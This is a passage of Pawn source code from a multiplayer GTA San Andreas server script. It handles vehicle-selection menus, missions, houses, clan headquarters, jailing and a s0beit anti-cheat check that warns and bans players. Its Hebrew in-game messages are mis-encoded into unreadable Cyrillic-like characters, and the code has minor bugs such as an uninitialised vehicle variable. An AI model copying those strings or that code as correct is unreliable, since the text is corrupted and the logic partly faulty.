	for(new i = 0; i < SELECTION_ITEMS; i++) if(ModelsSelect[playerid][i] != PlayerText:INVALID_TEXT_DRAW)
	{
		PlayerTextDrawDestroy(playerid, ModelsSelect[playerid][i]);
		ModelsSelect[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
}
forward PlayerText:model_CreateModelTD(playerid,modelid,Float:X,Float:Y,Float:XRot,Float:YRot,Float:ZRot,Float:Zoom,Float:Width,Float:Height,bgcolor);
stock PlayerText:model_CreateModelTD(playerid,modelid,Float:X,Float:Y,Float:XRot,Float:YRot,Float:ZRot,Float:Zoom,Float:Width,Float:Height,bgcolor)
{
	new PlayerText:txtPlayerSprite = CreatePlayerTextDraw(playerid,X,Y,"");
    PlayerTextDrawFont(playerid,txtPlayerSprite,TEXT_DRAW_FONT_MODEL_PREVIEW);
    PlayerTextDrawColor(playerid,txtPlayerSprite,0xFFFFFFFF);
    PlayerTextDrawBackgroundColor(playerid,txtPlayerSprite,bgcolor);
    PlayerTextDrawTextSize(playerid,txtPlayerSprite,Width,Height);
    PlayerTextDrawSetPreviewModel(playerid,txtPlayerSprite,modelid);
    PlayerTextDrawSetPreviewRot(playerid,txtPlayerSprite,XRot,YRot,ZRot,Zoom);
    PlayerTextDrawSetSelectable(playerid,txtPlayerSprite,1);
    PlayerTextDrawShow(playerid,txtPlayerSprite);
    return txtPlayerSprite;
}
stock model_CreateTextDraws(playerid,ModelTypes:id)
{
	ModelsText[playerid][2] = CreatePlayerTextDraw(playerid,BASE_X,BASE_Y+20.0,"                                            ~n~");
    PlayerTextDrawUseBox(playerid,ModelsText[playerid][2],1);
    PlayerTextDrawBoxColor(playerid,ModelsText[playerid][2],ModelInfo[_:id][mBackground]);
	PlayerTextDrawLetterSize(playerid,ModelsText[playerid][2],5.0,5.0);
	PlayerTextDrawFont(playerid,ModelsText[playerid][2],0);
	PlayerTextDrawSetShadow(playerid,ModelsText[playerid][2],0);
    PlayerTextDrawSetOutline(playerid,ModelsText[playerid][2],0);
    PlayerTextDrawColor(playerid,ModelsText[playerid][2],0x000000FF);
    PlayerTextDrawTextSize(playerid,ModelsText[playerid][2],WIDTH,HEIGHT);
   	PlayerTextDrawBackgroundColor(playerid,ModelsText[playerid][2],ModelInfo[_:id][mBackground]);
    PlayerTextDrawShow(playerid,ModelsText[playerid][2]);
    //Header
	ModelsText[playerid][1] = CreatePlayerTextDraw(playerid,BASE_X,BASE_Y,ModelInfo[_:id][mHeader]);
   	PlayerTextDrawUseBox(playerid,ModelsText[playerid][1],0);
	PlayerTextDrawLetterSize(playerid,ModelsText[playerid][1],1.25,3.0);
	PlayerTextDrawFont(playerid,ModelsText[playerid][1],0);
	PlayerTextDrawSetShadow(playerid,ModelsText[playerid][1],0);
    PlayerTextDrawSetOutline(playerid,ModelsText[playerid][1],1);
    PlayerTextDrawColor(playerid,ModelsText[playerid][1],0xACCBF1FF);
    PlayerTextDrawShow(playerid,ModelsText[playerid][1]);
    //Page
	ModelsText[playerid][0] = CreatePlayerTextDraw(playerid,WIDTH-30.0,BASE_Y+15.0,"0/0");
   	PlayerTextDrawUseBox(playerid,ModelsText[playerid][0],0);
	PlayerTextDrawLetterSize(playerid,ModelsText[playerid][0],0.4,1.1);
	PlayerTextDrawFont(playerid,ModelsText[playerid][0],1);
	PlayerTextDrawSetShadow(playerid,ModelsText[playerid][0],0);
    PlayerTextDrawSetOutline(playerid,ModelsText[playerid][0],1);
    PlayerTextDrawColor(playerid,ModelsText[playerid][0],0xACCBF1FF);
    PlayerTextDrawShow(playerid,ModelsText[playerid][0]);
    //Next
    ModelsText[playerid][3] = CreatePlayerTextDraw(playerid,WIDTH-30.0,BASE_Y+HEIGHT+100.0,NEXT_TEXT);
   	PlayerTextDrawUseBox(playerid,ModelsText[playerid][3],1);
   	PlayerTextDrawBoxColor(playerid,ModelsText[playerid][3],0x000000FF);
   	PlayerTextDrawBackgroundColor(playerid,ModelsText[playerid][3],0x000000FF);
	PlayerTextDrawLetterSize(playerid,ModelsText[playerid][3],0.4,1.1);
	PlayerTextDrawFont(playerid,ModelsText[playerid][3],1);
	PlayerTextDrawSetShadow(playerid,ModelsText[playerid][3],0);
    PlayerTextDrawSetOutline(playerid,ModelsText[playerid][3],0);
    PlayerTextDrawColor(playerid,ModelsText[playerid][3],0x4A5A6BFF);
    PlayerTextDrawSetSelectable(playerid,ModelsText[playerid][3],1);
    PlayerTextDrawAlignment(playerid,ModelsText[playerid][3],2);
    PlayerTextDrawTextSize(playerid,ModelsText[playerid][3],16.0,50.0);
    PlayerTextDrawShow(playerid,ModelsText[playerid][3]);
    //Prev
    ModelsText[playerid][4] = CreatePlayerTextDraw(playerid,WIDTH-90.0,BASE_Y+HEIGHT+100.0,PREV_TEXT);
   	PlayerTextDrawUseBox(playerid,ModelsText[playerid][4],1);
   	PlayerTextDrawBoxColor(playerid,ModelsText[playerid][4],0x000000FF);
   	PlayerTextDrawBackgroundColor(playerid,ModelsText[playerid][4],0x000000FF);
	PlayerTextDrawLetterSize(playerid,ModelsText[playerid][4],0.4,1.1);
	PlayerTextDrawFont(playerid,ModelsText[playerid][4],1);
	PlayerTextDrawSetShadow(playerid,ModelsText[playerid][4],0);
    PlayerTextDrawSetOutline(playerid,ModelsText[playerid][4],0);
    PlayerTextDrawColor(playerid,ModelsText[playerid][4],0x4A5A6BFF);
    PlayerTextDrawSetSelectable(playerid,ModelsText[playerid][4],1);
    PlayerTextDrawAlignment(playerid,ModelsText[playerid][4],2);
    PlayerTextDrawTextSize(playerid,ModelsText[playerid][4],16.0,50.0);
    PlayerTextDrawShow(playerid,ModelsText[playerid][4]);
    //Cancel
    ModelsText[playerid][5] = CreatePlayerTextDraw(playerid,WIDTH-150.0,BASE_Y+HEIGHT+100.0,CANCEL_TEXT);
   	PlayerTextDrawUseBox(playerid,ModelsText[playerid][5],1);
   	PlayerTextDrawBoxColor(playerid,ModelsText[playerid][5],0x000000FF);
   	PlayerTextDrawBackgroundColor(playerid,ModelsText[playerid][5],0x000000FF);
	PlayerTextDrawLetterSize(playerid,ModelsText[playerid][5],0.4,1.1);
	PlayerTextDrawFont(playerid,ModelsText[playerid][5],1);
	PlayerTextDrawSetShadow(playerid,ModelsText[playerid][5],0);
    PlayerTextDrawSetOutline(playerid,ModelsText[playerid][5],0);
    PlayerTextDrawColor(playerid,ModelsText[playerid][5],0x4A5A6BFF);
    PlayerTextDrawSetSelectable(playerid,ModelsText[playerid][5],1);
    PlayerTextDrawAlignment(playerid,ModelsText[playerid][5],2);
    PlayerTextDrawTextSize(playerid,ModelsText[playerid][5],16.0,50.0);
    PlayerTextDrawShow(playerid,ModelsText[playerid][5]);
    return 1;
}
forward OnPlayerModelSelection(playerid,response,listid,modelid);
public OnPlayerModelSelection(playerid,response,listid,modelid)
{
	printf("OnPlayerModelSelection: %d,%d,%d,%d",playerid,response,listid,modelid);
	if(listid == Models[mVehicles])
    {
        if(response)
        {
            new string[M_S], Float:p[4], avid = INVALID_VEHICLE_ID;
      		for(new i = 0; i < MAX_ADMIN_VEHICLES && avid == INVALID_VEHICLE_ID; i++) if(playerinfo[playerid][createdv][i] == INVALID_VEHICLE_ID) avid = i;
			if(avid == -1 || playerinfo[playerid][createdvs] >= MAX_ADMIN_VEHICLES) return SendClientMessage(playerid,red," .ыь рующя щыхь ьщЎх° Єу " #MAX_ADMIN_VEHICLES " °ысщэ у°ъ фрующя, Ёр ьючхў чьў Єь юЁ· ьщЎх° Єху");
            GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetPlayerFacingAngle(playerid,p[3]);
			GetXYInFrontOfPlayer(playerid,p[0],p[1],IsPlayerInAnyVehicle(playerid)? 8.0:5.0);
			new vid = CreateVehicleEx(modelid,p[0],p[1],p[2],p[3]+90,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
			playerinfo[playerid][createdv][avid] = vid;
			playerinfo[playerid][createdvs]++;
			format(string,sizeof(string)," %s :°ыс %d ЁхЎ°",GetVehicleName(modelid),vid);
			return SendClientMessage(playerid,yellow,string);
        }
        return 1;
    }
    return 1;
}
//=[HackCheck]==================================================================
forward HackCheck(playerid);
public HackCheck(playerid)
{
    new Float:p[3];
    GetPlayerCameraFrontVector(playerid, p[0], p[1], p[2]);
    if(p[2] < -0.8)
	{
        SetFreeze(playerid,0);
        playerinfo[playerid][hacker] = true;
        if(playerinfo[playerid][logged])
        {
	        new year, month, day, formattedstring[11];
			getdate(year, month, day);
		 	format(formattedstring,sizeof(formattedstring),"%02d/%02d/%d", day, month, year);
	        if(equal(playerinfo[playerid][s0beitdate1],""))
	        {
	        	Log("s0beit",playerid,"S0beit detected - first warning");
	        	fsetstring(fuser(playerid),"s0beitdate1",formattedstring);
	        	playerinfo[playerid][s0beitdate1] = formattedstring;
	        }
	        else if(equal(playerinfo[playerid][s0beitdate2],""))
	        {
	        	if(DaysBetweenDates(playerinfo[playerid][s0beitdate1],GetDateAsString()) >= 90)
	        	{
	        	    Log("s0beit",playerid,"S0beit detected - second warning, however, more than 3 months passed since the first warning, setting first warning a new date.");
    	        	fsetstring(fuser(playerid),"s0beitdate1",formattedstring);
	        		playerinfo[playerid][s0beitdate1] = formattedstring;
	        	}
	        	else
	        	{
	        		Log("s0beit",playerid,"S0beit detected - second warning");
		        	fsetstring(fuser(playerid),"s0beitdate2",formattedstring);
		        	playerinfo[playerid][s0beitdate2] = formattedstring;
	        	}
	        }
	        else
	        {
	       		fsetstring(fuser(playerid),"s0beitdate3",formattedstring);
	        	playerinfo[playerid][s0beitdate3] = formattedstring;
	        	Log("s0beit",playerid,"S0beit detected - third warning, banning in 30 seconds...");
	        	if(lagstatus <= 100) SetTimerPck(playerinfo[playerid][s0beitbantimer],"s0beitban",30000,0,"d",playerid);
	        }
        }
        else
        {
       		Log("s0beit",playerid,"S0beit detected - guest account, banning in 30 seconds...");
        	if(lagstatus <= 100) SetTimerPck(playerinfo[playerid][s0beitbantimer],"s0beitban",30000,0,"d",playerid);
        }
    }
    else SetFreeze(playerid,0);
   	playerinfo[playerid][firstspawn] = false;
    return 1;
}
//=[CreateExplosionVW]==========================================================
stock CreateExplosionVW(Float:x,Float:y,Float:z,type,Float:radius,vw = 0)
{
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerVirtualWorld(i) == vw) CreateExplosionForPlayer(i,x,y,z,type,radius);
	return 1;
}
//=[GenerateMissionPickup]======================================================
stock GenerateMissionPickup(playerid,missionid)
{
	new cpid;
	do cpid = random(MAX_MISSION_TARGETS) + 1;
	while(playerinfo[playerid][mlpickup][cpid - 1]);
	playerinfo[playerid][mlpickup][cpid - 1] = 1;
	/*new str[M_S];
	format(str, sizeof(str), "current cpid: %d", cpid);
	SendClientMessageToAll(red, str);
	for(new x; x < 5; x++) format(str, sizeof(str), "mlpickupid[%d]: %d", x, playerinfo[playerid][mlpickup][x]), SendClientMessageToAll(red, str);
	SendClientMessage(playerid, red, "SERVER LOG UPDATED!!");*/
	for(new c = 0; c < sizeof(MissionsCheckpoints); c++) if(MissionsCheckpoints[c][msPickup] == cpid && MissionsCheckpoints[c][msID] == missionid)
	{
		playerinfo[playerid][mpickup] = CreateDynamicPickup(3799,1,MissionsCheckpoints[c][msPos][0],MissionsCheckpoints[c][msPos][1],MissionsCheckpoints[c][msPos][2]-1.0,-1,-1,playerid);
		playerinfo[playerid][mcheckpoint] = CreateDynamicCP(MissionsCheckpoints[c][msPos][0],MissionsCheckpoints[c][msPos][1],MissionsCheckpoints[c][msPos][2]-1.0,2.0,-1,-1,playerid);
		SetPlayerMapIcon(playerid,icon_mission,MissionsCheckpoints[c][msPos][0],MissionsCheckpoints[c][msPos][1],MissionsCheckpoints[c][msPos][2],MissionsInfo[missionid][msIcon],0,MAPICON_GLOBAL);
		break;
	}
}
//=[KickMission]================================================================
stock KickMission(playerid,missionid)
{
	new string[M_S];
	missions[missionid] = false;
	DestroyVehicle(playerinfo[playerid][mvehicle]);
	DestroyDynamicPickup(playerinfo[playerid][mpickup]);
	DestroyDynamicCP(playerinfo[playerid][mcheckpoint]);
	playerinfo[playerid][mission] = INVALID_MISSION_ID;
	format(string,sizeof(string)," .фЇёу· с%s",MissionsInfo[missionid][msName]);
	SendClientMessage(playerid,red,string);
	RemovePlayerMapIcon(playerid,icon_mission);
	for(new t = 0; t < 3; t++) PlayerTextDrawDestroy(playerid,playerinfo[playerid][mtexts][t]);
	playerinfo[playerid][mstimenew] = 15*60;
	SetPlayerVirtualWorld(playerid, world_normal);
	SpawnPlayer(playerid);
}
//=[CreateHouse]================================================================
//stock GetHouseInteriorBySize(size) return 1;
stock CreateHouse(Float:x,Float:y,Float:z,size,bool:real = false)
{
	if(!real)
	{
	    new File:f, string[M_S];
	    if(!fexist(file_houses)) fcreate(file_houses);
	    f = fopen(file_houses,io_append);
	    format(string,sizeof(string),"CreateHouse(%.4f,%.4f,%.4f,%i);\r\n",x,y,z,size);
	    fwrite(f,string),fclose(f);
	}
	houseinfo[houses][hx] = x;
	houseinfo[houses][hy] = y;
	houseinfo[houses][hz] = z;
	//houseinfo[houses][hInterior] = GetHouseInteriorBySize(size);
	houseinfo[houses][hcost] = size*1000000;
	houseinfo[houses][hsize] = size, houses++;
	new hid = (houses-1), string[M_S];
	format(string,sizeof(string),"%s%d.ini",folder_houses,hid);
	if(!fexist(string))
	{
	    fcreate(string);
	    fsetstring(string,"Owner","None");
	    fsetint(string,"Furnitures",0);
	    fsetfloat(string,"X",x);
	    fsetfloat(string,"Y",y);
	    fsetfloat(string,"Z",z);
	}
	houseinfo[hid][hpickup] = CreatePickupEx(1272,1,x,y,z,8,world_normal,hid);
	return hid;
}
//=[StartHeadServer]============================================================
stock StartHeadServer(reason,killerid = INVALID_PLAYER_ID)
{
	new string[M_S],before = headserver;
	headserver = GetRandomPlayer();
	switch(reason)
	{
	    case 0: format(string,sizeof(string)," !ьфщх· °р∙ ф∙°· " @c(white) "%s " @c(lightblue) "°р∙ ф∙°· ф·Ё·ў юф∙°· хьыя Ёсч° срў°рщх· " @c(white) "%s",GetName(headserver),GetName(before));
	    case 1: format(string,sizeof(string)," !ьфщх· °р∙ ф∙°· " @c(white) "%s " @c(lightblue) "юрч° хфхЇЄьф фрхЇЎщф ''°р∙ ф∙°·'' Ёсч° срў°рщх·",GetName(headserver));
	    case 2: format(string,sizeof(string)," !хьўч р· юўхюх, ыЄ· фхр °р∙ ф∙°· " @c(white) "%s " @c(lightblue) "фЎьщч ьф°хт р· °р∙ ф∙°· " @c(white) "%s",GetName(before),GetName(killerid));
	    case 3: format(string,sizeof(string)," !ьфщх· °р∙ ф∙°· " @c(white) "%s " @c(lightblue) "фщф ю°хчў юфюўьу· сю∙ъ цюя °с Ёсч° срў°рщх· " @c(white) "%s " @c(lightblue) "юрч° х",GetName(headserver),GetName(before));
	}
	SendClientMessageToAll(lightblue,string);
	if(IsPlayerConnected(killerid)) headserver = killerid;
	if(IsPlayerConnected(before) && strlen(playerinfo[before][tagbefore]) > 0) playerinfo[before][tag] = EOS, format(playerinfo[before][tag],M_S,"%s",playerinfo[before][tagbefore]),playerinfo[before][tagcol] = playerinfo[before][tagcbefore];
	if(IsPlayerConnected(headserver) && strlen(playerinfo[headserver][tag]) > 0)
	{
		format(playerinfo[headserver][tagbefore],M_S,"%s",playerinfo[headserver][tag]), playerinfo[headserver][tagcbefore] = playerinfo[headserver][tagcol];
		format(playerinfo[headserver][tag],M_S,"°р∙ ф∙°·");
		playerinfo[headserver][tagcol] = orange;
 		GiveWeapon(headserver,35,3);
	}
}
//=[StopHeadServer]=============================================================
stock StopHeadServer()
{
	SendClientMessage(headserver,red," .фрхЇЎщф ''°р∙ ф∙°·'' фхЇёўф хьыя чц°· ьюЎсъ ф°тщь");
	playerinfo[headserver][tag] = EOS;
	if(strlen(playerinfo[headserver][tagbefore]) > 0) format(playerinfo[headserver][tag],M_S,"%s",playerinfo[headserver][tagbefore]);
	playerinfo[headserver][tagbefore] = EOS;
 	headserver = INVALID_PLAYER_ID;
}
//=[JailPlayer]=================================================================
stock JailPlayer(playerid,time)
{
	if(playerinfo[playerid][jail][0] <= 0)
	{
		SetTimerPck(playerinfo[playerid][jail][1],"UnJail",1000,1,"d",playerid);
		if(playerinfo[playerid][inact]) OutOfActivity(playerid);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"JailTime",playerinfo[playerid][jail][0]);
	}
	SetPlayerPos(playerid,264.3591,77.5832,1001.0391);
	SetPlayerFacingAngle(playerid,270.0);
	SetCameraBehindPlayer(playerid);
	SetPlayerInterior(playerid,6);
	SetFreeze(playerid,1,true);
	playerinfo[playerid][jail][0] = time;
}
//=[propformat_RPass]===========================================================
stock propformat_RPass(playerid)
{
	new str[32];
	format(str,sizeof(str),"rpass_%s",GetName(playerid));
	return str;
}
//=[propformat_LoginInfo]=======================================================
stock propformat_LoginInfo(playerid)
{
	new str[32];
	format(str,sizeof(str),"login_%s",GetName(playerid));
	return str;
}
//=[propformat_LeaveTime]=======================================================
stock propformat_LeaveTime(ip[])
{
	new str[32];
	format(str,sizeof(str),"lv_%s",ip);
	return str;
}
//=[dmgformat]==================================================================
stock dmgformat(from)
{
	new str[32];
	format(str,sizeof(str),"dmgformat_%d",from);
	return str;
}
//=[LoadViewHQ]=================================================================
stock LoadViewHQ(hqid)
{
	#if lagtest
		LagTest_Start("LoadViewHQ");
	#endif
	new string[M_S], key[32], keyid = 0, tmp[M_S], vid, c = 0, Float:xmid, Float:ymid, objs, Float:zt;
	format(string, M_S, folder_hq "%d.ini", hqid);
	format(key,sizeof(key),"Object%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanObject);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanObject,',');
		viewhqinfo[hqid][hqobjects][keyid] = CreateSObject(strval(clanObject[0]),floatstr(clanObject[1]),floatstr(clanObject[2]),floatstr(clanObject[3]),floatstr(clanObject[4]),floatstr(clanObject[5]),floatstr(clanObject[6]));
		keyid++, c++;
		format(key,sizeof(key),"Object%d",keyid);
		xmid += floatstr(clanObject[1]);
		ymid += floatstr(clanObject[2]);
		objs++;
		zt+=floatstr(clanObject[3]);
	}
	xmid = xmid / objs, ymid = ymid / objs, zt = zt / objs;
	viewhqinfo[hqid][hqxmid] = xmid;
	viewhqinfo[hqid][hqymid] = ymid;
	viewhqinfo[hqid][hqzmid] = zt;
	keyid = 0;
	format(key,sizeof(key),"Vehicle%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanVehicle);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanVehicle,',');
		viewhqinfo[hqid][hqvehicles][keyid] = CreateVehicleEx(strval(clanVehicle[0]),floatstr(clanVehicle[1]),floatstr(clanVehicle[2]),floatstr(clanVehicle[3]),floatstr(clanVehicle[4]), 1, 1, respawntime);
		format(tmp,sizeof(tmp),"HQ #%d", hqid);
		SetVehicleNumberPlate(vid, tmp);
		keyid++, c++;
		format(key,sizeof(key),"Vehicle%d",keyid);
	}
	keyid = 0;
	format(key,sizeof(key),"Pickup%d",keyid);
	while(fkeyexist(string,key))
	{
		Reset2DString(clanPickup);
		format(tmp,sizeof(tmp),fgetstring(string,key));
		split(tmp,clanPickup,',');
		viewhqinfo[hqid][hqpickups][keyid] = CreatePickupEx(strval(clanPickup[0]), 1, floatstr(clanPickup[1]),floatstr(clanPickup[2]),floatstr(clanPickup[3]));
		keyid++, c++;
		format(key,sizeof(key),"Pickup%d",keyid);
	}
	keyid = 0;
	new Float:info[4], Float:min_x, Float:min_y, Float:max_x, Float:max_y;
	info[0] = fgetint(string, "HQCorner1x");
	info[1] = fgetint(string, "HQCorner1y");
	info[2] = fgetint(string, "HQCorner2x");
	info[3] = fgetint(string, "HQCorner2y");
	if(info[0] > info[2])
	{
	    min_x = info[2];
	    max_x = info[0];
	}
	else
	{
	    min_x = info[0];
	    max_x = info[2];
	}
	if(info[1] > info[3])
	{
	    min_y = info[3];
		max_y = info[1];
	}
	else
	{
		min_y = info[1];
		max_y = info[3];
	}
	viewhqinfo[hqid][hqarea] = CreateArea(min_x, min_y, max_x, max_y, area_viewhq, hqid);
	viewhqinfo[hqid][hqzone] = GangZoneCreate(min_x, min_y, max_x, max_y);
	viewhqinfo[hqid][hqvalid] = 1;
	viewhqinfo[hqid][hqsize] = fgetint(string, "HQSize");
	GangZoneShowForAll(viewhqinfo[hqid][hqzone], grey);
	UpdateHQList();
	#if lagtest
		LagTest_End("LoadViewHQ");
	#endif
	return 1;
}
//=[UnloadViewHQ]=================================================================
stock UnloadViewHQ(hqid)
{
	#if lagtest
		LagTest_Start("UnloadViewHQ");
	#endif
	for(new x; x < 50; x++) if(viewhqinfo[hqid][hqobjects][x] > 0) DestroySObject(viewhqinfo[hqid][hqobjects][x]);
	for(new x; x < 50; x++) if(viewhqinfo[hqid][hqvehicles][x] > 0) DestroyVehicleEx(viewhqinfo[hqid][hqvehicles][x]);
	for(new x; x < 50; x++) if(viewhqinfo[hqid][hqpickups][x] > 0) DestroyPickupEx(viewhqinfo[hqid][hqpickups][x]);
	DestroyArea(viewhqinfo[hqid][hqarea]);
	viewhqinfo[hqid][hqowner] = -1;
	viewhqinfo[hqid][hqsize] = 0;
	viewhqinfo[hqid][hqxmid] = 0.0;
	viewhqinfo[hqid][hqymid] = 0.0;
	GangZoneHideForAll(viewhqinfo[hqid][hqzone]);
	GangZoneDestroy(viewhqinfo[hqid][hqzone]);
	UpdateHQList();
	#if lagtest
		LagTest_End("UnloadViewHQ");
	#endif
}
//=[SellHQForClan]==============================================================
stock SellHQForClan(playerid, clanid, hqid)
{
	new size = viewhqinfo[hqid][hqsize];
	new price = viewhq_prices[size];
	if(GetMoney(playerid) < price) return 1;
	GiveMoney(playerid, 0-price);
	new file[M_S];
	format(file, sizeof(file), folder_hq "%d.ini", hqid);
	fsetint(file, "HQOwner", clanid);
	UnloadViewHQ(hqid);
	LoadClanHeadquarter(clanid, hqid);
	new str[M_S];
	format(str, sizeof(str), " !Єсх° °ыщ∙· юЇўуф %s сёыхэ ∙ь %d$ %s с°ых· ьўьря", viewhq_descs[size], price, claninfo[clanid][cname]);
	SendClientMessageToAll(orange, str);
	UpdateHQList();
	return 1;
}
//=[GetClanHQ]==================================================================
stock GetClanHQ(clanid)
{
	new str[M_S];
	if(claninfo[clanid][chqid] == -1) for(new x; x < MAX_VIEWHQS && claninfo[clanid][chqid] == -1; x++)
	{
		format(str,sizeof(str),folder_hq "%d.ini",x);
		if(fexist(str))
		{
		    if(fgetint(str, "HQOwner") == -1) continue;
		    if(fgetint(str, "HQOwner") == clanid) claninfo[clanid][chqid] = x;
		}
	}
	return claninfo[clanid][chqid];
}
//=[UpdateHQList]===============================================================
stock UpdateHQList()
{
	hqlistinfo[0] = EOS;
	new str[M_S], c, own[30], dist, closetele, csize = 4;
	start:
	for(new x; x < MAX_VIEWHQS; x++) if(viewhqinfo[x][hqvalid] && viewhqinfo[x][hqsize] == csize)
	{
	    c++;
		if(viewhqinfo[x][hqowner] == -1) own = @c(green)"ЇЁхщ ь°ыщ∙ф";
		else format(own, 30, "{%s}%s", ClanHexColor(viewhqinfo[x][hqowner]), claninfo[viewhqinfo[x][hqowner]][cname]);
		if(viewhqinfo[x][hqowner] == -1)
		{
			for(new t, j = sizeof(Teleports); t < j; t++) if(!Teleports[t][Ti] && Teleports[t][Tw] == world_normal && Teleports[t][Ttype] == tele_normal)
			{
	        	if(!t) dist = DistanceToPoint(Teleports[t][Tx], Teleports[t][Ty], Teleports[t][Tz], viewhqinfo[x][hqxmid], viewhqinfo[x][hqymid], 0), closetele = 0;
				else if(DistanceToPoint(Teleports[t][Tx], Teleports[t][Ty], Teleports[t][Tz], viewhqinfo[x][hqxmid], viewhqinfo[x][hqymid], 0) < dist) closetele = t, dist = DistanceToPoint(Teleports[t][Tx], Teleports[t][Ty], Teleports[t][Tz], viewhqinfo[x][hqxmid], viewhqinfo[x][hqymid], 0);
			}
		}
		else closetele = claninfo[viewhqinfo[x][hqowner]][cclosetele];
		format(str, sizeof(str), "{FFFFFF}%d. %s {FFFFFF}(%s :ючщ°: %s$, тхуь: %d, ∙щтх° ў°хс)\n", c, own, Teleports[closetele][Tcmd], Comma(viewhq_prices[csize]), csize);
	    strcat(hqlistinfo, str);
	}
	csize--;
	if(csize) goto start;
}
//=[SetClanMaxBank]=============================================================
stock SetClanMaxBank(clanid, max, reason[])
{
	new str[M_S];
	format(str, sizeof(str), folder_clans "%s.ini", claninfo[clanid][cname]);
	fsetint(str, "maxbank", max);
	claninfo[clanid][cmaxbank] = max;
	format(str, sizeof(str), " :ютсь· сЁў фўьря фх°чсф ь %d$ юфёщсф", max);
	for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][clan] == clanid) SendClientMessage(x, orange, str), SendClientMessage(x, orange, reason);
}
//=[Comma]======================================================================
stock Comma(numbers)
{
    new temp[24], counter = -1;
    valstr(temp,numbers);
    for(new i = strlen(temp);i > 0; i--)
    {
        counter++;
        if(counter == 3)
        {
            strins(temp,",",i);
            counter = 0;
        }
    }
    return temp;
}
//=[Reward_Give]================================================================
stock Reward_Give(playerid,reward[])
{
	new s[128];
	format(s,sizeof(s),folder_rewards "%s/",reward);
	folderCheck(s);
	format(s,sizeof(s),"%s%s.ini",s,GetDateAsString('_'));
	fileCheck(s);
	fsetint(s,GetName(playerid),1);
	fsetint(s,GetIP(playerid),1);
}
//=[Reward_Check]===============================================================
stock Reward_Check(playerid,reward[])
{
	new s[128];
	format(s,sizeof(s),folder_rewards "%s",reward);
	folderCheck(s);
	format(s,sizeof(s),"%s/%s.ini",s,GetDateAsString('_'));
	return fexist(s) ? (fkeyexist(s,GetName(playerid)) || fkeyexist(s,GetIP(playerid))) : false;
}
//=[GetCloseMoneyArea]============================================================
stock GetCloseMoneyArea(playerid)
{
	for(new i = 0; i < sizeof(MoneyAreas); i++) if(IsPlayerInRangeOfPoint(playerid,35.0,MoneyAreas[i][maCoords][0],MoneyAreas[i][maCoords][1],MoneyAreas[i][maCoords][4]) || IsPlayerInRangeOfPoint(playerid,25.0,MoneyAreas[i][maCoords][2],MoneyAreas[i][maCoords][3],MoneyAreas[i][maCoords][5])) return i;
	return -1;
}
//=[GetVehicleMaxSeats]=========================================================
stock GetVehicleMaxSeats(modelid)
{
	new VehicleSeats[] =
	{
		4,2,2,2,4,4,1,2,2,4,2,2,2,4,2,2,4,2,4,2,4,4,2,2,2,1,4,4,4,2,1,100,1,2,2,0,2,100,4,2,4,1,2,2,2,4,1,2,
		1,0,0,2,1,1,1,2,2,2,4,4,2,2,2,2,1,1,4,4,2,2,4,2,1,1,2,2,1,2,2,4,2,1,4,3,1,1,1,4,2,2,4,2,4,1,2,2,2,4,
		4,2,2,1,2,2,2,2,2,4,2,1,1,2,1,1,2,2,4,2,2,1,1,2,2,2,2,2,2,2,2,4,1,1,1,2,2,2,2,100,100,1,4,2,2,2,2,2,
		4,4,2,2,4,4,2,1,2,2,2,2,2,2,4,4,2,2,1,2,4,4,1,0,0,1,1,2,1,2,2,1,2,4,4,2,4,1,0,4,2,2,2,2,0,0,100,2,2,
		1,4,4,4,2,2,2,2,2,4,2,0,0,0,4,0,0
	};
	return VehicleSeats[modelid - 400];
}
//=[GetVehicleEmptySeat]========================================================
stock GetVehicleEmptySeat(vehicleid)
{
	new m = GetVehicleMaxSeats(GetVehicleModel(vehicleid)), bool:seats[100] = {false,...};
	for(new i = 0, s = -1; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,vehicleid)) if((s = GetPlayerVehicleSeat(i)) < 100) seats[s] = true;
	for(new i = 0; i < m; i++) if(!seats[i]) return i;
	return -1;
}
//=[UpdateMoneyAreaPosition]====================================================
stock UpdateMoneyAreaPosition(ma,update,Float:x=0.0,Float:y=0.0,Float:xrad=0.0,Float:yrad=0.0)
{
	if(update)
	{
		if(IsValidArea(MoneyAreas[ma][maAreaID]))
		{
			DestroyArea(MoneyAreas[ma][maAreaID]);
			MoneyAreas[ma][maAreaID] = CreateArea(x-xrad,y-yrad,x+xrad,y+yrad,area_money,0,0,world_normal,MoneyAreas[ma][maCoords][4],MoneyAreas[ma][maCoords][5]);
		}
		GangZoneDestroy(MoneyAreas[ma][maGangZoneID]);
		MoneyAreas[ma][maGangZoneID] = GangZoneCreate(x-xrad,y-yrad,x+xrad,y+yrad);
	}
	else
	{
		if(IsValidArea(MoneyAreas[ma][maAreaID]))
		{
			DestroyArea(MoneyAreas[ma][maAreaID]);
			MoneyAreas[ma][maAreaID] = CreateArea(MoneyAreas[ma][maCoords][0],MoneyAreas[ma][maCoords][1],MoneyAreas[ma][maCoords][2],MoneyAreas[ma][maCoords][3],area_money,0,0,world_normal,MoneyAreas[ma][maCoords][4],MoneyAreas[ma][maCoords][5]);
		}
		GangZoneDestroy(MoneyAreas[ma][maGangZoneID]);
		MoneyAreas[ma][maGangZoneID] = GangZoneCreate(MoneyAreas[ma][maCoords][0],MoneyAreas[ma][maCoords][1],MoneyAreas[ma][maCoords][2],MoneyAreas[ma][maCoords][3]);
	}
	GangZoneHideForAll(MoneyAreas[ma][maGangZoneID]);
	GangZoneShowForAll(MoneyAreas[ma][maGangZoneID],0x0080FF78);
}
/*
setfire ·ющущ [LCMDS]
border confused
? Ёыёщэ ьр Ёцы°щэ рч°щ ∙ю·Ё·ўщэ хю·чс°щэ
V ls-elevator
V propoerty map icons
V new properties
V hostname V2
V reloadcps 1sec after teleport
V File Not Found
V clan permissions /hq
V freeze activity
V inv 4 staff
V clan reorder
V ap 2 чу∙
V dj amusicDR
